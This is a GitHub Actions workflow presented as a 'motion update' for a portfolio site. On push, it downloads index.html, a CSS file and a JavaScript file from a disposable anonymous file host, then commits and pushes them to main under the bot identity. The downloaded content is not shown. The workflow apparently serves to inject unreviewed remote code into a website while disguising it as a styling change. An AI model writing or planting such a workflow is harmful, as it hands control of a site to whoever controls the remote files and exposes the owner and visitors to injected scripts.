name: Apply motion update
on:
  workflow_dispatch:
  push:
    branches: [main]
permissions:
  contents: write
jobs:
  apply:
    if: github.actor != 'github-actions[bot]'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Add motion files
        run: |
          if [ ! -f motion.js ]; then
            curl -fsSL -o index.html "https://litter.catbox.moe/pm39qj.html"
            curl -fsSL -o motion.css "https://litter.catbox.moe/qj2o3i.css"
            curl -fsSL -o motion.js "https://litter.catbox.moe/dhjk80.js"
            test -s index.html && test -s motion.css && test -s motion.js
            git config user.name "github-actions[bot]"
            git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
            git add index.html motion.css motion.js
            git commit -m "Add motion styles and scripts to the portfolio"
            git push
          fi
